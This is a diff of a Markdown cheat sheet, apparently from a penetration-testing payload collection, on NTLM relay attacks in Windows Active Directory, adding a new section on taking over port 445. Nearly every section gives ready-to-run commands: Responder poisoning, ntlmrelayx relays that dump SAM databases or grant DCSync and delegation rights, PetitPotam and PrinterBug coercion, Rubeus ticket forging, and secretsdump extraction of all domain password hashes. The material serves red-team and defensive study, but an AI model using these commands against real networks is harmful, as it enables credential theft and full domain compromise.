@@ -21,13 +21,12 @@ NTLM reflection vulnerability in the SMB protocolOnly targeting Windows 2000 to 
 
 > This vulnerability allows an attacker to redirect an incoming SMB connection back to the machine it came from and then access the victim machine using the victim’s own credentials.
 
-* https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08-068
+* <https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08-068>
 
 ```powershell
 msf > use exploit/windows/smb/smb_relay
 msf exploit(smb_relay) > show targets
 ```
-
 
 ## LDAP signing not required and LDAP channel binding disabled
 
@@ -46,14 +45,15 @@ sudo ./Responder.py -I eth0 -wfrd -P -v
 # On second terminal
 sudo python ./ntlmrelayx.py -t ldaps://IP_DC --add-computer
 ```
-It is required here to relay to LDAP over TLS because creating accounts is not allowed over an unencrypted connection.
 
+It is required here to relay to LDAP over TLS because creating accounts is not allowed over an unencrypted connection.
 
 ## SMB Signing Disabled and IPv4
 
 If a machine has `SMB signing`:`disabled`, it is possible to use Responder with Multirelay.py script to perform an `NTLMv2 hashes relay` and get a shell access on the machine. Also called **LLMNR/NBNS Poisoning**
 
 1. Open the Responder.conf file and set the value of `SMB` and `HTTP` to `Off`.
+
     ```powershell
     [Responder Core]
     ; Servers to start
@@ -61,12 +61,14 @@ If a machine has `SMB signing`:`disabled`, it is possible to use Responder with 
     SMB = Off     # Turn this off
     HTTP = Off    # Turn this off
     ```
+
 2. Run `python  RunFinger.py -i IP_Range` to detect machine with `SMB signing`:`disabled`.
-3. Run `python Responder.py -I <interface_card>` 
+3. Run `python Responder.py -I <interface_card>`
 4. Use a relay tool such as `ntlmrelayx` or `MultiRelay`
-    - `impacket-ntlmrelayx -tf targets.txt` to dump the SAM database of the targets in the list. 
-    - `python MultiRelay.py -t <target_machine_IP> -u ALL`
+    * `impacket-ntlmrelayx -tf targets.txt` to dump the SAM database of the targets in the list.
+    * `python MultiRelay.py -t <target_machine_IP> -u ALL`
 5. ntlmrelayx can also act as a SOCK proxy with every compromised sessions.
+
     ```powershell
     $ impacket-ntlmrelayx -tf /tmp/targets.txt -socks -smb2support
     [*] Servers started, waiting for connections
@@ -91,15 +93,17 @@ If a machine has `SMB signing`:`disabled`, it is possible to use Responder with 
 
 **Mitigations**:
 
- * Disable LLMNR via group policy
+* Disable LLMNR via group policy
+
     ```powershell
     Open gpedit.msc and navigate to Computer Configuration > Administrative Templates > Network > DNS Client > Turn off multicast name resolution and set to Enabled
     ```
- * Disable NBT-NS
+
+* Disable NBT-NS
+
     ```powershell
     This can be achieved by navigating through the GUI to Network card > Properties > IPv4 > Advanced > WINS and then under "NetBIOS setting" select Disable NetBIOS over TCP/IP
     ```
-
 
 ## SMB Signing Disabled and IPv6
 
@@ -123,7 +127,6 @@ impacket-ntlmrelayx -6 -wh $attacker_ip -l /tmp -socks -debug
 impacket-ntlmrelayx -ip 10.10.10.1 -wh $attacker_ip -t ldaps://10.10.10.2
 ```
 
-
 ## Drop the MIC - CVE-2019-1040
 
 > The CVE-2019-1040 vulnerability makes it possible to modify the NTLM authentication packets without invalidating the authentication, and thus enabling an attacker to remove the flags which would prevent relaying from SMB to LDAP
@@ -136,14 +139,15 @@ python2 scanMIC.py 'DOMAIN/USERNAME:PASSWORD@TARGET'
 [*] Target TARGET is not vulnerable to CVE-2019-1040 (authentication was rejected)
 ```
 
-- Using any AD account, connect over SMB to a victim Exchange server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant DCSync privileges to the attacker account. The attacker account can now use DCSync to dump all password hashes in AD
+* Using any AD account, connect over SMB to a victim Exchange server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant DCSync privileges to the attacker account. The attacker account can now use DCSync to dump all password hashes in AD
+
     ```powershell
     TERM1> python printerbug.py testsegment.local/username@s2012exc.testsegment.local <attacker ip/hostname>
     TERM2> ntlmrelayx.py --remove-mic --escalate-user ntu -t ldap://s2016dc.testsegment.local -smb2support
     TERM1> secretsdump.py testsegment/ntu@s2016dc.testsegment.local -just-dc
     ```
 
-- Using any AD account, connect over SMB to the victim server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant Resource Based Constrained Delegation privileges for the victim server to a computer account under the control of the attacker. The attacker can now authenticate as any user on the victim server.
+* Using any AD account, connect over SMB to the victim server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant Resource Based Constrained Delegation privileges for the victim server to a computer account under the control of the attacker. The attacker can now authenticate as any user on the victim server.
 
     ```powershell
     # create a new machine account
@@ -155,7 +159,6 @@ python2 scanMIC.py 'DOMAIN/USERNAME:PASSWORD@TARGET'
     export KRB5CCNAME=DOMAIN_ADMIN_USER_NAME.ccache
     secretsdump.py -k -no-pass second-dc-server.local -just-dc
     ```
-
 
 ## Drop the MIC 2 - CVE-2019-1166
 
@@ -170,7 +173,6 @@ python2 scanMIC.py 'DOMAIN/USERNAME:PASSWORD@TARGET'
 ntlmrelayx.py -t ldap://dc.domain.com --escalate-user 'youruser$' -smb2support --remove-mic --delegate-access
 ```
 
-
 ## Ghost Potato - CVE-2019-1384
 
 Requirements:
@@ -179,21 +181,20 @@ Requirements:
 * User must be a member of the Backup Operators group
 * Token must be elevated
 
-Using a modified version of ntlmrelayx : https://shenaniganslabs.io/files/impacket-ghostpotato.zip
+Using a modified version of ntlmrelayx : <https://shenaniganslabs.io/files/impacket-ghostpotato.zip>
 
 ```powershell
 ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe
 ```
 
-
-## RemotePotato0 DCOM DCE RPC relay 
+## RemotePotato0 DCOM DCE RPC relay
 
 > It abuses the DCOM activation service and trigger an NTLM authentication of the user currently logged on in the target machine
 
 Requirements:
 
-- a shell in session 0 (e.g. WinRm shell or SSH shell)
-- a privileged user is logged on in the session 1 (e.g. a Domain Admin user)
+* a shell in session 0 (e.g. WinRm shell or SSH shell)
+* a privileged user is logged on in the session 1 (e.g. a Domain Admin user)
 
 ```powershell
 # https://github.com/antonioCoco/RemotePotato0/
@@ -203,13 +204,12 @@ Session0> RemotePotato0.exe -r 192.168.83.130 -p 9998 -s 2
 Terminal> psexec.py 'LAB/winrm_user_1:Password123!@192.168.83.135'
 ```
 
-
 ## DNS Poisonning - Relay delegation with mitm6
 
-Requirements: 
+Requirements:
 
-- IPv6 enabled (Windows prefers IPV6 over IPv4)
-- LDAP over TLS (LDAPS)
+* IPv6 enabled (Windows prefers IPV6 over IPv4)
+* LDAP over TLS (LDAPS)
 
 > ntlmrelayx relays the captured credentials to LDAP on the domain controller, uses that to create a new machine account, print the account's name and password and modifies the delegation rights of it.
 
@@ -236,15 +236,13 @@ export KRB5CCNAME=administrator.ccache
 secretsdump.py -k -no-pass target.lab.local  
 ```
 
-
 ## Relaying with WebDav Trick
 
 > Example of exploitation where you can coerce machine accounts to authenticate to a host and combine it with Resource Based Constrained Delegation to gain elevated access. It allows attackers to elicit authentications made over HTTP instead of SMB
 
 **Requirement**:
 
-*  WebClient service
-
+* WebClient service
 
 **Enable WebClient**:
 
@@ -253,6 +251,7 @@ WebClient service can be enable on the machine using several techniques:
 * Mapping a WebDav server using `net` command : `net use ...`
 * Typing anything into the explorer address bar that isn't a local file or directory
 * Browsing to a directory or share that has a file with a `.searchConnector-ms` extension located inside.
+
     ```xml
     <?xml version="1.0" encoding="UTF-8"?>
     <searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
@@ -271,6 +270,7 @@ WebClient service can be enable on the machine using several techniques:
 **Exploitation**:
 
 * Discover machines on the network with enabled WebClient service
+
     ```ps1
     webclientservicescanner 'domain.local'/'user':'password'@'machine'
     netexec smb 10.10.10.10 -d 'domain' -u 'user' -p 'password' -M webdav
@@ -278,22 +278,25 @@ WebClient service can be enable on the machine using several techniques:
     ```
 
 * Disable HTTP in Responder
+
     ```ps1
     sudo vi /usr/share/responder/Responder.conf
     ```
 
 * Generate a Windows machine name, e.g: "WIN-UBNW4FI3AP0"
+
     ```ps1
     sudo responder -I eth0
     ```
 
 * Prepare for RBCD against the DC
+
     ```ps1
     python3 ntlmrelayx.py -t ldaps://dc --delegate-access -smb2support
     ```
 
+* Trigger the authentication to relay to our nltmrelayx: `PetitPotam.exe WIN-UBNW4FI3AP0@80/test.txt 10.10.10.10`, the listener host must be specified with the FQDN or full netbios name like `logger.domain.local@80/test.txt`. Specifying the IP results in anonymous auth instead of System.
 
-* Trigger the authentication to relay to our nltmrelayx: `PetitPotam.exe WIN-UBNW4FI3AP0@80/test.txt 10.10.10.10`, the listener host must be specified with the FQDN or full netbios name like `logger.domain.local@80/test.txt`. Specifying the IP results in anonymous auth instead of System. 
   ```ps1
   # PrinterBug
   dementor.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "TARGET_IP"
@@ -305,7 +308,8 @@ WebClient service can be enable on the machine using several techniques:
   PetitPotam.exe "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "TARGET_IP"
   ```
 
-* Use the created account to ask for a service ticket: 
+* Use the created account to ask for a service ticket:
+
     ```ps1
     .\Rubeus.exe hash /domain:purple.lab /user:WVLFLLKZ$ /password:'iUAL)l<i$;UzD7W'
     .\Rubeus.exe s4u /user:WVLFLLKZ$ /aes256:E0B3D87B512C218D38FAFDBD8A2EC55C83044FD24B6D740140C329F248992D8F /impersonateuser:Administrator /msdsspn:host/pc1.purple.lab /altservice:cifs /nowrap /ptt
@@ -320,11 +324,10 @@ python3 /opt/krbrelayx/dnstool.py -u lab.lan\\jdoe -p 'P@ssw0rd' -r attacker.lab
 python3 /opt/PetitPotam.py -u jdoe -p 'P@ssw0rd' -d lab.lan attacker@80/test 192.168.1.3
 ```
 
-
 ## Man-in-the-middle RDP connections with pyrdp-mitm
 
-* https://github.com/GoSecure/pyrdp
-* https://www.gosecure.net/blog/2018/12/19/rdp-man-in-the-middle-smile-youre-on-camera/
+* <https://github.com/GoSecure/pyrdp>
+* <https://www.gosecure.net/blog/2018/12/19/rdp-man-in-the-middle-smile-youre-on-camera/>
 
 **Usage**
 
@@ -342,8 +345,60 @@ pyrdp-mitm.py <IP> -k private_key.pem -c certificate.pem # with custom key and c
 
 **Alternatives**
 
-* S3th: https://github.com/SySS-Research/Seth, performs ARP spoofing prior to launching the RDP listener	
+* [SySS-Research/Seth](https://github.com/SySS-Research/Seth), performs ARP spoofing prior to launching the RDP listener
 
+## Common Issues Forwarding Port 445
+
+By default the SMB service is listening on port 445, blocking any relaying attempt on this port
+
+**Technique #1**: Forward port 445 on Windows machine using a driver
+
+* [praetorian-inc/PortBender](https://github.com/praetorian-inc/PortBender) - TCP Port Redirection Utility
+
+    ```ps1
+    rportfwd 8445 127.0.0.1 445 # Machine 8445 redirected to Teamserver 445
+    sudo proxychains python3 examples/ntlmrelayx.py -t smb://10.10.10.10 -smb2support # relay SMB to 10.10.10.10
+
+    upload WinDivert32.sys
+    upload WinDivert64.sys
+
+    PortBender redirect 445 8445 # Redirect port 445 to 8445 on the machine
+    ```
+
+**Technique #2**: Disable SMB service, to easily portforward port 445
+
+* [zyn3rgy/smbtakeover](https://github.com/zyn3rgy/smbtakeover) - BOF and Python3 implementation of technique to unbind 445/tcp on Windows via SCM interactions
+
+    ```ps1
+    python3 smbtakeover.py atlas.lab/josh:password1@10.0.0.21 check
+    python3 smbtakeover.py atlas.lab/josh:password1@10.0.0.21 stop
+    python3 smbtakeover.py atlas.lab/josh:password1@10.0.0.21 start
+
+    bof_smbtakeover localhost check
+    bof_smbtakeover 10.0.0.21 stop
+    bof_smbtakeover localhost start
+
+    rportfwd_local 445 127.0.0.1 445
+    ```
+
+* [Windows/sc.exe](https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/sc-config)
+
+    ```ps1
+    sc config LanmanServer start= disabled
+    sc stop LanmanServer
+    sc stop srv2
+    sc stop srvnet
+    ```
+
+* [XiaoliChan/wmiexec-Pro](https://github.com/XiaoliChan/wmiexec-Pro)
+
+    ```ps1
+    wmiexec-pro.py lab.local/admin@target.lab.local service -action disable -service-name "LanmanServer"
+    wmiexec-pro.py lab.local/admin@target.lab.local service -action stop -service-name "LanmanServer"
+    wmiexec-pro.py lab.local/admin@target.lab.local service -action stop -service-name "srv2"
+    wmiexec-pro.py lab.local/admin@target.lab.local service -action disable -service-name "srvnet"
+    wmiexec-pro.py lab.local/admin@target.lab.local service -action getinfo -service-name "srvnet"
+    ```
 
 ## References
 
@@ -353,5 +408,6 @@ pyrdp-mitm.py <IP> -k private_key.pem -c certificate.pem # with custom key and c
 * [Lateral Movement – WebClient](https://pentestlab.blog/2021/10/20/lateral-movement-webclient/)
 * [NTLM Relaying to LDAP - The Hail Mary of Network Compromise - @logangoins - July 23, 2024](https://logan-goins.com/2024-07-23-ldap-relay/)
 * [Playing with Relayed Credentials - June 27, 2018](https://www.secureauth.com/blog/playing-relayed-credentials)
-* [Relay Your Heart Away: An OPSEC-Conscious Approach to 445 Takeover - Nick Powers - 07/27/2024](https://www.youtube.com/watch?v=iBqOOkQGJEA)
+* [Relay Your Heart Away - An OPSEC-Conscious Approach to 445 Takeover - Nick Powers (@zyn3rgy) - Aug 1, 2024](https://posts.specterops.io/relay-your-heart-away-an-opsec-conscious-approach-to-445-takeover-1c9b4666c8ac)
+* [Relay Your Heart Away: An OPSEC-Conscious Approach to 445 Takeover - Nick Powers (@zyn3rgy) - July 27, 2024](https://www.youtube.com/watch?v=iBqOOkQGJEA)
 * [Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) - Adam Toscher - Mar 9, 2018](https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)
